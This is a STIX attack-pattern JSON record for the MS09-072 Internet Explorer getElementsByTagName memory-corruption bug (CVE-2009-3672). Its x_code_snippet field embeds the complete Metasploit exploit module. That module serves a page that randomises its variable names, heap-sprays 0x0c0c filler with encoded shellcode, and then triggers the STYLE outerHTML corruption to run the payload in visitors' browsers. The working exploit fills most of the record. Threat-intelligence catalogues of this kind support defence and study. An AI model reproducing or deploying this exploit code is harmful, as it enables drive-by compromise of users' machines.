{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e96e31b2-5400-4e95-8388-3e6e42a71fef",
    "created": "2024-08-14T16:42:23.557475Z",
    "modified": "2024-08-14T16:42:23.557479Z",
    "name": "MS09-072 Microsoft Internet Explorer Style getElementsByTagName Memory Corruption",
    "description": " This module exploits a vulnerability in the getElementsByTagName function as implemented within Internet Explorer.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms09_072_style_object.rb",
            "external_id": "ms09_072_style_object.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3672"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20090316061713/http://taossa.com/archive/bh08sotirovdowd.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #\n  # Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn\n  #\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #\t:ua_name    => HttpClients::IE,\n  #\t:ua_minver  => \"6.0\",\n  #\t:ua_maxver  => \"7.0\",\n  #\t:javascript => true,\n  #\t:os_name => OperatingSystems::Match::WINDOWS,\n  #\t:vuln_test  => nil, # no way to test without just trying it\n  #\t:rank       => LowRanking  # exploitable on ie7/vista\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS09-072 Microsoft Internet Explorer Style getElementsByTagName Memory Corruption',\n      'Description'    => %q{\n        This module exploits a vulnerability in the getElementsByTagName function\n      as implemented within Internet Explorer.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'securitylab.ir <K4mr4n_st[at]yahoo.com>',\n          'jduck'\n        ],\n      'References'     =>\n        [\n          ['MSB', 'MS09-072'],\n          ['CVE', '2009-3672'],\n          ['OSVDB', '50622'],\n          ['BID', '37085'],\n          ['URL', 'https://web.archive.org/web/20090316061713/http://taossa.com/archive/bh08sotirovdowd.pdf'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'          => 'process',\n          'HTTP::compression' => 'gzip',\n          'HTTP::chunked'     => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'Compat'   =>\n            {\n              'ConnectionType' => '-find',\n            },\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { }],\n        ],\n      'DisclosureDate' => '2009-11-20',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n\n    # resulting eips:\n    # 0x501d6bd8 # windows vista ie7 (mshtml.dll 7.0.6001.18203)\n    # 0xc5fe7dc9 # windows xp sp3 ie6 (mshtml.dll 6.0.2900.5848)\n    # nul deref! # windows xp sp3 ie7 (mshtml.dll 7.0.5730.13)\n    # 0x6e767fae # windows 2k3 sp2 ie6 (mshtml.dll 6.0.3790.4470)\n    # 0x6cf941a7 # windows 2k3 sp2 ie7 (mshtml.dll 7.0.6000.16825)\n\n    print_status(\"Entering heap spray mode\")\n\n    var_memory    = rand_text_alpha(rand(100) + 1)\n    var_boom      = rand_text_alpha(rand(100) + 1)\n    var_body      = rand_text_alpha(rand(100) + 1)\n    var_unescape  = rand_text_alpha(rand(100) + 1)\n    var_shellcode = rand_text_alpha(rand(100) + 1)\n    var_spray     = rand_text_alpha(rand(100) + 1)\n    var_start     = rand_text_alpha(rand(100) + 1)\n    var_i         = rand_text_alpha(rand(100) + 1)\n    var_ss        = rand_text_alpha(rand(100) + 1)\n    var_fb        = rand_text_alpha(rand(100) + 1)\n    var_bk        = rand_text_alpha(rand(100) + 1)\n\n    html = %Q|<!DOCTYPE>\n<head>\n<script language=javascript>\nfunction #{var_boom}(){ document.getElementsByTagName('STYLE')[0].outerHTML++; }\nfunction #{var_body}(){\nvar #{var_unescape} = unescape;\nvar #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');\nvar #{var_spray} = #{var_unescape}( \"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"c\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"c\" );\nvar #{var_ss} = 20 + #{var_shellcode}.length;\nwhile (#{var_spray}.length < #{var_ss}) #{var_spray}+=#{var_spray};\n#{var_fb} = #{var_spray}.substring(0,#{var_ss});\n#{var_bk} = #{var_spray}.substring(0,#{var_spray}.length-#{var_ss});\nwhile(#{var_bk}.length+#{var_ss} < 0x100000) #{var_bk} = #{var_bk}+#{var_bk}+#{var_fb};\nvar #{var_memory} = new Array();\nfor (#{var_i}=0;#{var_i}<1285;#{var_i}++) #{var_memory}[#{var_i}]=#{var_bk}+#{var_shellcode};\n#{var_boom}();\n}\n</script>\n<STYLE>* { margin: 0; overflow: scroll }</STYLE>\n<BODY ONLOAD=\"#{var_body}()\">\n</body>\n</html>\n|\n\n    # Transmit the response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-20",
    "x_mitre_platforms": [
        "win'"
    ]
}